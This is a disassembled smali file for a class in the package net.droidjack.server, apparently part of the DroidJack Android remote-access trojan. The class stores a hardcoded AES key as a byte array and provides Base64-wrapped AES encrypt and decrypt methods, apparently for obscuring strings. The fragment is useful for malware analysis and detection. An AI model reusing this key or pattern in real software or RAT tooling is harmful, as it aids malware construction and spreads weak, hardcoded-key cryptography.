.class public Lnet/droidjack/server/aj;
.super Ljava/lang/Object;


# static fields
.field private static final a:[B


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    sput-object v0, Lnet/droidjack/server/aj;->a:[B

    return-void

    :array_0
    .array-data 1
        0x4ct
        0x52t
        0x53t
        0x41t
        0x4et
        0x4at
        0x55t
        0x49t
        0x53t
        0x54t
        0x48t
        0x45t
        0x52t
        0x41t
        0x4at
        0x41t
    .end array-data
.end method

.method public static a(Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    invoke-static {}, Lnet/droidjack/server/aj;->a()Ljava/security/Key;

    move-result-object v0

    const-string v1, "AES"

    invoke-static {v1}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2, v0}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    invoke-virtual {p0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v1, v0}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v0, v1}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private static a()Ljava/security/Key;
    .locals 3

    new-instance v0, Ljavax/crypto/spec/SecretKeySpec;

    sget-object v1, Lnet/droidjack/server/aj;->a:[B

    const-string v2, "AES"

    invoke-direct {v0, v1, v2}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    return-object v0
.end method

.method public static b(Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    invoke-static {}, Lnet/droidjack/server/aj;->a()Ljava/security/Key;

    move-result-object v0

    const-string v1, "AES"

    invoke-static {v1}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v1

    const/4 v2, 0x2

    invoke-virtual {v1, v2, v0}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    const/4 v0, 0x0

    invoke-static {p0, v0}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v0

    invoke-virtual {v1, v0}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v0

    new-instance v1, Ljava/lang/String;

    invoke-direct {v1, v0}, Ljava/lang/String;-><init>([B)V

    return-object v1
.end method
